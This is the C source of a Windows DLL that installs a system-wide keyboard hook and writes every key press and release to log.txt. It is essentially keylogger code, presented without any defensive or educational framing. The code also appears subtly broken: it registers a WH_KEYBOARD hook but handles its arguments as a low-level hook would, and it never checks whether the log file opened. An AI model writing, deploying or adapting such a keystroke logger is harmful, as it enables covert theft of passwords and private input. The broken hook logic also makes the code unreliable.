#include <windows.h>
#include <stdio.h>
HMODULE g_hModule;

// Hook procedure
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    static char buffer[1024] = { 0 };
    FILE* fp;

    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* pkbdllhook = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYUP) {
            buffer[pkbdllhook->vkCode] = 0;
            fopen_s(&fp, "log.txt", "a");
            fprintf(fp, "Key released: %d\n", pkbdllhook->vkCode); // Write to file when a key is released
            fclose(fp);
        }
        else if (wParam == WM_KEYDOWN) {
            buffer[pkbdllhook->vkCode] = 1;
            fopen_s(&fp, "log.txt", "a");
            fprintf(fp, "Key pressed: %d\n", pkbdllhook->vkCode); // Write to file when a key is pressed
            fclose(fp);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

__declspec(dllexport) HHOOK InstallHook() {
    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hModule, 0);
    if (hHook != NULL) {
        printf("Keyboard hook installed successfully.\n");
    }
    else {
        printf("Failed to install keyboard hook. Error: %d\n", GetLastError());
    }
    return hHook;
}

__declspec(dllexport) BOOL UninstallHook(HHOOK hHook) {
    return UnhookWindowsHookEx(hHook);
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        g_hModule = hModule;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
